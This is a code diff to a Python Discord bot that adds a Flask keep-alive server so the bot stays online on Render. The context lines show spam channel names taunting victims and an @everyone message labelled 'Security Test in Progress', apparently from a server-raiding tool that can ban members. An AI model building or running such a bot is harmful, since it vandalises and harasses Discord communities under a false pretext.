@@ -6,8 +6,10 @@ from colorama import Fore, Style
 import asyncio
 import os
 from dotenv import load_dotenv
+from threading import Thread
+from flask import Flask
 
-# Load environment variables from Render
+# Load environment variables
 load_dotenv()
 token = os.getenv('BOT_TOKEN')
 
@@ -17,11 +19,25 @@ SPAM_CHANNEL = ["Testnoob256 runs you", "Get ran", "Testnoob256", "oops Beamed",
                 "beamed by Testnoob256", "I run you", "kinda got beamed by Testnoob256"]
 SPAM_MESSAGE = ["@everyone Security Test in Progress"]
 
+# ===== WEB SERVER FOR RENDER (KEEP ALIVE) =====
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Discord Bot is Running!", 200
+
+@app.route('/health')
+def health():
+    return {"status": "alive", "bot": "online"}, 200
+
+def run_web():
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
+
 # ===== INTENTS CONFIGURATION =====
 intents = discord.Intents.default()
-intents.members = True  # Essential for banning/member-list features
-intents.guilds = True  # Essential for guild management (channels, roles)
-intents.message_content = True  # Essential for reading commands
+intents.members = True
+intents.guilds = True
+intents.message_content = True
 
 # ===== BOT CREATION WITH INTENTS =====
 client = commands.Bot(command_prefix="!", intents=intents)
@@ -111,4 +127,10 @@ if __name__ == "__main__":
         print("ERROR: BOT_TOKEN not found in environment variables!")
         print("Please set BOT_TOKEN in Render's environment variables.")
     else:
+        # Start web server in background thread
+        print("Starting web server...")
+        Thread(target=run_web, daemon=True).start()
+        
+        # Start Discord bot
+        print("Starting Discord bot...")
         client.run(token)
